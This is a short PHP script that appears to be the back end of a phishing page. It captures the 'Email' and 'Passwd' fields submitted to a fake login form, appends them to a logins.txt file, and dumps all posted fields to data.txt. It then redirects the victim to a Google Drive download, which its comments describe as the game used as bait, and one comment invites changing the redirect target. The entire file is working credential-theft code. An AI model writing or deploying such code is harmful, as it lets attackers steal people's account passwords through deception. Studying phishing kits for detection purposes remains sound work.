<?php

			
			$pass = $_POST["Passwd"];
			$email=$_POST["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("/logins.txt", "a") or die('fopen failed');

			
  			//Writing email and password to logins.txt. 
  			fwrite($file , $email."	".$pass.PHP_EOL) or die('fwrite failed');
			
  			fclose($file);//closing logins.txt.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			$output = '';
			foreach($_POST as $key => $val)
    		$output .= sprintf("%s = %s\n", $key, $val);

			file_put_contents('data.txt', $output);
  			header("Location: https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view");
			exit();
			
			

?>